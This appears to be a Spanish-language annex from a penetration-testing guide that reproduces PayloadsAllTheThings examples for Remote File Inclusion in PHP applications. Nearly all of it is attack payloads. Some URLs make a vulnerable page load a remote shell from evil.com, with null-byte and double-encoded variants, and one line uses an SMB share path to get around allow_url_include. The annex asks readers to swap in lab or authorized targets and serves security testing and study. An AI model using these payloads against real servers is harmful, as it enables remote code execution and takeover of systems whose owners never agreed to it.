# Remote File Inclusion (RFI): anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [File Inclusion/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/File%20Inclusion/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Inclusión de archivos / Inclusión remota de archivos

```ini
allow_url_include = On
```

```powershell
http://example.com/index.php?page=http://evil.com/shell.txt
```

### Variantes presentes en tablas o texto del apartado

```text
allow_url_include
```

## 2. Inclusión remota de archivos / Byte nulo

```powershell
http://example.com/index.php?page=http://evil.com/shell.txt%00
```

## 3. Inclusión remota de archivos / Doble Codificación

```powershell
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```

## 4. Inclusión remota de archivos / Evasión de allow_url_include

### Variantes presentes en tablas o texto del apartado

```text
allow_url_include
allow_url_fopen
shell.php
http://example.com/index.php?page=\\10.0.0.1\share\shell.php
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
